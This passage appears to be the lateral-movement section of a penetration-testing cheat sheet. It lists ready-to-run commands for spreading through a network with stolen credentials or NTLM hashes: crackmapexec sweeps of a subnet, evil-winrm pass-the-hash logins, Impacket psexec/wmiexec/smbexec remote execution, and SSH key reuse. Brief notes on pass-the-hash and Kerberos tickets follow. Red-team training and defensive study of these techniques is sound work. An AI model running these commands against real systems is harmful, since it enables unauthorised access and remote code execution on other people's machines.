6. Lateral Movement

This is trust abuse at scale.

crackmapexec (The Map)
crackmapexec smb 10.10.10.0/24 -u user -p password

crackmapexec smb 10.10.10.0/24 -u user -H <NTLM_HASH>


CME answers:

Where creds work

Where hashes work

Where admin access exists

evil‑winrm (Clean Windows Movement)
evil-winrm -i 10.10.10.20 -u user -p password

evil-winrm -i 10.10.10.20 -u user -H <NTLM_HASH>


WinRM is lateral movement that feels almost polite.

Impacket Tools (Remote Execution)
psexec.py user:password@10.10.10.21

wmiexec.py user:password@10.10.10.22

smbexec.py user:password@10.10.10.23


Each trades stealth for reliability differently. Choose intentionally.

SSH (Linux Lateral)
ssh user@10.10.10.30


Reuse keys. Reuse trust. Systems remember who they trusted yesterday.

Pass‑the‑Hash / Ticket Concepts

NTLM hashes ≈ reusable identity

Kerberos tickets ≈ time‑limited authority

You’re no longer “logging in.”
You’re assuming identity.
